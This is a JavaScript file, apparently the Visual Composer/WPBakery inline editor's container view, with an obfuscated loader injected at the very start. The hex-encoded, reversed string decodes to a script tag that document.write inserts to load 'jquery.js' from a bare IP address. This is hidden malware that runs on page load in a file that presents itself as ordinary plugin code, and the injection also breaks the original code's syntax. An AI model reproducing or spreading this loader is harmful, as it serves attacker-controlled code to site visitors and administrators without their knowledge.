var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))(function ( $ ) {
	vc.events.on( 'shortcodeView:updated', function ( model ) {
		var modelId, settings;
		settings = vc.map[ model.get( 'shortcode' ) ] || false;
		if ( true === settings.is_container ) {
			modelId = model.get( 'id' );
			vc.frame_window.vc_iframe.updateChildGrids( modelId );
		}
	} );
	window.InlineShortcodeViewContainer = window.InlineShortcodeView.extend( {
		controls_selector: '#vc_controls-template-container',
		events: {
			'click > .vc_controls .vc_element .vc_control-btn-delete': 'destroy',
			'click > .vc_controls .vc_element .vc_control-btn-edit': 'edit',
			'click > .vc_controls .vc_element .vc_control-btn-clone': 'clone',
			'click > .vc_controls .vc_element .vc_control-btn-prepend': 'prependElement',
			'click > .vc_controls .vc_control-btn-append': 'appendElement',
			'click > .vc_empty-element': 'appendElement',
			'mouseenter': 'resetActive',
			'mouseleave': 'holdActive'
		},
		hold_active: false,
		parent_view: false,
		initialize: function ( params ) {
			_.bindAll( this, 'holdActive' );
			window.InlineShortcodeViewContainer.__super__.initialize.call( this, params );
			if ( this.model.get( 'parent_id' ) ) {
				this.parent_view = vc.shortcodes.get( this.model.get( 'parent_id' ) ).view;
			}
		},
		resetActive: function ( e ) {
			this.hold_active && window.clearTimeout( this.hold_active );
		},
		holdActive: function ( e ) {
			this.resetActive();
			this.$el.addClass( 'vc_hold-active' );
			var view = this;
			this.hold_active = window.setTimeout( function () {
				view.hold_active && window.clearTimeout( view.hold_active );
				view.hold_active = false;
				view.$el.removeClass( 'vc_hold-active' );
			}, 700 );
		},
		content: function () {
			if ( false === this.$content ) {
				this.$content = this.$el.find( '.vc_container-anchor:first' ).parent();
				this.$el.find( '.vc_container-anchor:first' ).remove();
			}
			return this.$content;
		},
		render: function () {
			window.InlineShortcodeViewContainer.__super__.render.call( this );
			this.content().addClass( 'vc_element-container' );
			this.$el.addClass( 'vc_container-block' );
			return this;
		},
		changed: function () {
			if ( this.allowAddControlOnEmpty() ) {
				(0 === this.$el.find( '.vc_element[data-tag]' ).length && this.$el.addClass( 'vc_empty' ).find(
					'> :first' ).addClass( 'vc_empty-element' ))
				|| this.$el.removeClass( 'vc_empty' ).find( '> .vc_empty-element' ).removeClass( 'vc_empty-element' );
			}
		},
		prependElement: function ( e ) {
			_.isObject( e ) && e.preventDefault();
			this.prepend = true;
			vc.add_element_block_view.render( this.model, true );
		},
		appendElement: function ( e ) {
			_.isObject( e ) && e.preventDefault();
			vc.add_element_block_view.render( this.model );
		},
		addControls: function () {
			var shortcodeTag, parentShortcodeTag, allAccess, editAccess, parentAllAccess, parentEditAccess, template, parent, data;
			shortcodeTag = this.model.get( 'shortcode' );
			template = $( this.controls_selector ).html();
			var parentName;
			parent = vc.shortcodes.get( this.model.get( 'parent_id' ) );
			if ( parent ) {
				parentName = vc.getMapped( parent.get( 'shortcode' ) ).name;
				parentShortcodeTag = parent.get( 'shortcode' );
			}

			allAccess = vc_user_access().shortcodeAll( shortcodeTag );
			editAccess = vc_user_access().shortcodeEdit( shortcodeTag );
			parentAllAccess = vc_user_access().shortcodeAll( parentShortcodeTag );
			parentEditAccess = vc_user_access().shortcodeEdit( parentShortcodeTag );

			data = {
				name: vc.getMapped( shortcodeTag ).name,
				tag: shortcodeTag,
				parent_name: parentName,
				parent_tag: parentShortcodeTag,
				can_edit: editAccess,
				can_all: allAccess,
				parent_can_edit: parentEditAccess,
				parent_can_all: parentAllAccess,
				state: vc_user_access().getState( 'shortcodes' ),
				allowAdd: this.allowAddControl(),
				switcherPrefix: ! parentAllAccess || ! allAccess ? '-disable-switcher' : ''
			};
			var compiledTemplate = vc.template( template,
				_.extend( {}, vc.templateOptions.custom, { evaluate: /\{#([\s\S]+?)#}/g } ) );
			this.$controls = $( compiledTemplate( data ).trim() ).addClass( 'vc_controls' );

			this.$controls.appendTo( this.$el );
		},
		allowAddControl: function () {
			return vc_user_access().getState( 'shortcodes' ) !== 'edit';
		},
		multi_edit: function ( e ) {
			var models = [], parent, children;
			_.isObject( e ) && e.preventDefault();
			if ( this.model.get( 'parent_id' ) ) {
				parent = vc.shortcodes.get( this.model.get( 'parent_id' ) );
			}
			if ( parent ) {
				models.push( parent );
				children = vc.shortcodes.where( { parent_id: parent.get( 'id' ) } );
				vc.multi_edit_element_block_view.render( models.concat( children ), this.model.get( 'id' ) );
			} else {
				vc.edit_element_block_view.render( this.model );
			}
		},
		allowAddControlOnEmpty: function () {
			return vc_user_access().getState( 'shortcodes' ) !== 'edit';
		}
	} );
})( window.jQuery );